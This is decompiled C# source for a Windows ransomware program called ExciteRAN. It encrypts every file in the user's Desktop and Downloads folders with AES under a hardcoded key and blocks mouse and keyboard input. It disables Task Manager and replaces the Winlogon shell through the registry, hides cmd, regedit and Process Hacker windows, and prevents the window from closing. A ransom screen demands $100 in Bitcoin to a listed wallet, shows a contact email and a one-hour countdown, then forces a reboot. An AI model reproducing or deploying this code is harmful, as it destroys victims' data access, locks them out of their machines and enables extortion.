using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using ExciteRAN.Properties;
using Microsoft.Win32;

namespace Rasomware2._0;

public class ExciteRAN : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private IContainer components = null;

	private Label lbl1;

	private Label label1;

	private Timer tmr_hide;

	private Timer tmr_show;

	private Timer tmr_if;

	private Timer tmr_encrypt;

	private Timer tmr_clock;

	private PictureBox pictureBox1;

	private Label timer;

	private Label label7;

	private Label label6;

	private Label label5;

	private Label label4;

	private Label label3;

	private Label label2;

	private Label label8;

	private Button decrypt;

	private TextBox decryptText;

	private Button copyButton;

	private LinkLabel linkToBtc;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public ExciteRAN()
	{
		InitializeComponent();
		((Control)timer).set_Text(TimeSpan.FromMinutes(60.0).ToString());
	}

	private void Ransomware2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Ransomware2_Load(object sender, EventArgs e)
	{
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		FreezeMouse();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)timer).set_Text((TimeSpan.FromMinutes(60.0) - (DateTime.Now - startTime)).ToString("mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_hide.Start();
		tmr_show.Start();
		tmr_if.Start();
		tmr_encrypt.Start();
		tmr_clock.Start();
	}

	private void tmr_hide_Tick(object sender, EventArgs e)
	{
		tmr_hide.Stop();
		((Form)this).set_Opacity(100.0);
		((Form)this).set_Size(new Size(917, 517));
		((Form)this).set_Location(new Point(500, 500));
		Thawouse();
	}

	private void tmr_show_Tick(object sender, EventArgs e)
	{
		tmr_show.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		File.Delete(path2);
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		tmr_if.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
		}
		tmr_if.Start();
	}

	private void tmr_encrypt_Tick(object sender, EventArgs e)
	{
		tmr_encrypt.Stop();
		Start_Encrypt();
	}

	private void tmr_clock_Tick(object sender, EventArgs e)
	{
		tmr_clock.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("ExciteRAN");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			Process.Start("shutdown", "/r /t 0");
			process.Kill();
		}
		((Form)this).Close();
	}

	private void decrypt_Click_1(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)decryptText).get_Text() == "")
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)decryptText).get_Text() == "password123")
		{
			MessageBox.Show("The key is correct", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			OFF_Encrypt();
			Process[] array = null;
			array = Process.GetProcessesByName("ExciteRAN");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void copyButton_Click_1(object sender, EventArgs e)
	{
		Clipboard.SetText("3QBhrTotAC8E1D8jKtUtXdHyGZNDAZP62U");
	}

	private void linkToBtc_LinkClicked_1(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://troypoint.com/how-to-buy-bitcoin/");
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "password123";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "password123";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
		}
	}

	private void decryptText_TextChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Expected O, but got Unknown
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Expected O, but got Unknown
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Expected O, but got Unknown
		//IL_01d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e3: Expected O, but got Unknown
		//IL_03fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0406: Expected O, but got Unknown
		//IL_04a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04aa: Expected O, but got Unknown
		//IL_0524: Unknown result type (might be due to invalid IL or missing references)
		//IL_052e: Expected O, but got Unknown
		//IL_05a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b2: Expected O, but got Unknown
		//IL_0632: Unknown result type (might be due to invalid IL or missing references)
		//IL_063c: Expected O, but got Unknown
		//IL_06b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bd: Expected O, but got Unknown
		//IL_0737: Unknown result type (might be due to invalid IL or missing references)
		//IL_0741: Expected O, but got Unknown
		//IL_07bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c5: Expected O, but got Unknown
		//IL_087c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0886: Expected O, but got Unknown
		//IL_0939: Unknown result type (might be due to invalid IL or missing references)
		//IL_0943: Expected O, but got Unknown
		//IL_0a0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a18: Expected O, but got Unknown
		//IL_0ac2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0acc: Expected O, but got Unknown
		//IL_0b53: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b5d: Expected O, but got Unknown
		//IL_0cd7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ce1: Expected O, but got Unknown
		//IL_0d22: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d2c: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ExciteRAN));
		lbl1 = new Label();
		label1 = new Label();
		tmr_hide = new Timer(components);
		tmr_show = new Timer(components);
		tmr_if = new Timer(components);
		tmr_encrypt = new Timer(components);
		tmr_clock = new Timer(components);
		pictureBox1 = new PictureBox();
		timer = new Label();
		label7 = new Label();
		label6 = new Label();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		label8 = new Label();
		decrypt = new Button();
		decryptText = new TextBox();
		copyButton = new Button();
		linkToBtc = new LinkLabel();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lbl1).set_AutoSize(true);
		((Control)lbl1).set_Font(new Font("Arial Narrow", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)lbl1).set_ForeColor(Color.White);
		((Control)lbl1).set_Location(new Point(13, 13));
		((Control)lbl1).set_Name("lbl1");
		((Control)lbl1).set_Size(new Size(0, 25));
		((Control)lbl1).set_TabIndex(2);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Cursor(Cursors.get_Help());
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(69, 13));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(0, 25));
		((Control)label1).set_TabIndex(3);
		label1.set_TextAlign((ContentAlignment)32);
		tmr_hide.set_Enabled(true);
		tmr_hide.set_Interval(10000);
		tmr_hide.add_Tick((EventHandler)tmr_hide_Tick);
		tmr_show.set_Enabled(true);
		tmr_show.set_Interval(1000);
		tmr_show.add_Tick((EventHandler)tmr_show_Tick);
		tmr_if.set_Enabled(true);
		tmr_if.set_Interval(300);
		tmr_if.add_Tick((EventHandler)tmr_if_Tick);
		tmr_encrypt.set_Enabled(true);
		tmr_encrypt.set_Interval(1000);
		tmr_encrypt.add_Tick((EventHandler)tmr_encrypt_Tick);
		tmr_clock.set_Enabled(true);
		tmr_clock.set_Interval(3600000);
		tmr_clock.add_Tick((EventHandler)tmr_clock_Tick);
		((Control)pictureBox1).set_BackColor(Color.FromArgb(206, 50, 53));
		((Control)pictureBox1).set_Cursor(Cursors.get_No());
		pictureBox1.set_Image((Image)(object)Resources.EXCITEran);
		((Control)pictureBox1).set_Location(new Point(12, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(252, 142));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(4);
		pictureBox1.set_TabStop(false);
		((Control)timer).set_AutoSize(true);
		((Control)timer).set_Font(new Font("Gotham Black", 47.99999f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		timer.set_ImageAlign((ContentAlignment)1024);
		((Control)timer).set_Location(new Point(648, 397));
		((Control)timer).set_Name("timer");
		((Control)timer).set_Size(new Size(243, 71));
		((Control)timer).set_TabIndex(25);
		((Control)timer).set_Text("00:00\r\n");
		timer.set_TextAlign((ContentAlignment)32);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Gotham", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_Location(new Point(11, 341));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(371, 18));
		((Control)label7).set_TabIndex(22);
		((Control)label7).set_Text("3QBhrTotAC8E1D8jKtUtXdHyGZNDAZP62U");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Gotham Black", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_Location(new Point(10, 320));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(384, 21));
		((Control)label6).set_TabIndex(21);
		((Control)label6).set_Text("PAY 100$ with Bitcoin to this wallet:");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Gotham Black", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_Location(new Point(16, 192));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(468, 70));
		((Control)label5).set_TabIndex(20);
		((Control)label5).set_Text(componentResourceManager.GetString("label5.Text"));
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Gotham Black", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(13, 157));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(97, 27));
		((Control)label4).set_TabIndex(19);
		((Control)label4).set_Text("RULES");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Gotham Black", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(272, 58));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(403, 28));
		((Control)label3).set_TabIndex(18);
		((Control)label3).set_Text("A key i required for decryption, which you can purchase \r\nvia this contact email \"excite@protonmail.com\"");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Gotham Black", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(272, 11));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(466, 28));
		((Control)label2).set_TabIndex(17);
		((Control)label2).set_Text("Oh noo... All your documents, videos, pictures, music and \r\nothers have been encrypted with a special encryption program !!?");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Gotham Black", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_Location(new Point(677, 374));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(186, 23));
		((Control)label8).set_TabIndex(16);
		((Control)label8).set_Text("REAMING TIME:");
		((Control)decrypt).set_BackColor(Color.FromArgb(205, 50, 53));
		((Control)decrypt).set_Cursor(Cursors.get_Default());
		((ButtonBase)decrypt).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)decrypt).set_FlatStyle((FlatStyle)0);
		((Control)decrypt).set_Font(new Font("Gotham Black", 8.999999f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)decrypt).set_Location(new Point(12, 423));
		((Control)decrypt).set_Name("decrypt");
		((Control)decrypt).set_Size(new Size(108, 31));
		((Control)decrypt).set_TabIndex(26);
		((Control)decrypt).set_Text("DECRYPT\r\n");
		((ButtonBase)decrypt).set_UseVisualStyleBackColor(false);
		((Control)decrypt).add_Click((EventHandler)decrypt_Click_1);
		((Control)decryptText).set_BackColor(Color.FromArgb(205, 50, 53));
		((TextBoxBase)decryptText).set_BorderStyle((BorderStyle)1);
		((Control)decryptText).set_Font(new Font("Gotham Black", 15.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)decryptText).set_ForeColor(Color.Black);
		((Control)decryptText).set_Location(new Point(126, 423));
		((Control)decryptText).set_Name("decryptText");
		((Control)decryptText).set_Size(new Size(514, 31));
		((Control)decryptText).set_TabIndex(27);
		((Control)decryptText).add_TextChanged((EventHandler)decryptText_TextChanged);
		((Control)copyButton).set_BackColor(Color.FromArgb(205, 50, 53));
		((Control)copyButton).set_Cursor(Cursors.get_Default());
		((ButtonBase)copyButton).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)copyButton).set_FlatStyle((FlatStyle)0);
		((Control)copyButton).set_Font(new Font("Gotham Black", 8.999999f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)copyButton).set_Location(new Point(12, 362));
		((Control)copyButton).set_Name("copyButton");
		((Control)copyButton).set_Size(new Size(108, 23));
		((Control)copyButton).set_TabIndex(28);
		((Control)copyButton).set_Text("Copy");
		((ButtonBase)copyButton).set_UseVisualStyleBackColor(false);
		((Control)copyButton).add_Click((EventHandler)copyButton_Click_1);
		((Control)linkToBtc).set_AutoSize(true);
		((Control)linkToBtc).set_Cursor(Cursors.get_Hand());
		((Control)linkToBtc).set_Font(new Font("Gotham", 8.999999f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		linkToBtc.set_LinkColor(Color.Black);
		((Control)linkToBtc).set_Location(new Point(272, 139));
		((Control)linkToBtc).set_Name("linkToBtc");
		((Control)linkToBtc).set_Size(new Size(129, 15));
		((Control)linkToBtc).set_TabIndex(29);
		linkToBtc.set_TabStop(true);
		((Control)linkToBtc).set_Text("How to get Bitcoins\r\n");
		linkToBtc.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkToBtc_LinkClicked_1));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(229, 56, 59));
		((Form)this).set_ClientSize(new Size(901, 478));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)linkToBtc);
		((Control)this).get_Controls().Add((Control)(object)copyButton);
		((Control)this).get_Controls().Add((Control)(object)decryptText);
		((Control)this).get_Controls().Add((Control)(object)decrypt);
		((Control)this).get_Controls().Add((Control)(object)timer);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)lbl1);
		((Control)this).set_Cursor(Cursors.get_No());
		((Control)this).set_ForeColor(Color.FromArgb(22, 26, 29));
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("ExciteRAN");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("ExciteRAN");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Ransomware2_FormClosing));
		((Form)this).add_Load((EventHandler)Ransomware2_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
